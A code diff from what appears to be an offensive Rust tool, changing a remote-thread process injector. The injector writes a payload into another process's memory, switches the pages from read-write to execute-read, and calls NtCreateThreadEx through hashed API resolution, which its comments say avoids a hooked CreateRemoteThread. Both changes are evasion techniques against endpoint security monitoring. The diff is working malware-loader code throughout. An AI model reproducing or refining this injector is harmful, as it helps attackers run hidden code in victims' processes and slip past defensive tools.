@@ -8,15 +8,16 @@ impl Injector for RemoteThreadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
         use winapi::um::processthreadsapi::OpenProcess;
         use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD};
-        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
         use winapi::um::handleapi::CloseHandle;
 
         unsafe {
             let h_proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, pid);
             if h_proc.is_null() { return Err(anyhow!("RemoteThread: OpenProcess failed")); }
 
-            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            // Allocate RW first; switch to RX after writing to avoid RWX pages
+            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if remote_mem.is_null() {
                 CloseHandle(h_proc);
                 return Err(anyhow!("RemoteThread: VirtualAllocEx failed"));
@@ -27,6 +28,10 @@ impl Injector for RemoteThreadInjector {
                 CloseHandle(h_proc);
                 return Err(anyhow!("RemoteThread: WriteProcessMemory failed"));
             }
+
+            // Switch to execute-read (no write)
+            let mut old_prot = 0u32;
+            VirtualProtectEx(h_proc, remote_mem, payload.len(), PAGE_EXECUTE_READ, &mut old_prot);
 
             // Use NtCreateThreadEx via pe_resolve to avoid the hooked CreateRemoteThread.
             let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
